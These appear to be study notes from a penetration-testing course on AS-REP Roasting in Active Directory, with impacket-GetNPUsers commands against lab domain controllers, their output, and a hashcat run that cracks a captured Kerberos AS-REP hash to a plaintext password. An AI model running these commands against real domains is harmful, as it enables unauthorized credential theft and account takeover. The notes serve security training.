
Theory
After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response. This attack is known as AS-REP Roasting
By default, the AD user account option Do not require Kerberos preauthentication is disabled, meaning that Kerberos preauthentication is performed for all users. However, it is possible to enable this account option manually. In assessments, we may find accounts with this option enabled as some applications and technologies require it to function properly.
We'll need to enter the IP address of the domain controller as an argument for -dc-ip, the name of the output file in which the AS-REP hash will be stored in Hashcat format for -outputfile, and -request to request the TGT.

22.2.2

AS-REP Roasting
```
impacket-GetNPUsers -dc-ip 172.16.236.10 -request -outputfile hashes.asreproast medtech.com/joe
```

```
┌──(kali㉿kali)-[~/Medtech-Challenge1]
└─$ impacket-GetNPUsers -dc-ip 172.16.236.10 -request -outputfile hashes.asreproast medtech.com/joe
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

Password:
No entries found!
```

Example

Using GetNPUsers to perform AS-REP roasting
```
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
```


Listing 15 - Obtaining the correct mode for Hashcat
```
kali@kali:~$ hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```


Cracking the AS-REP hash with Hashcat
```
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750cf33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22:Flowers1
...
```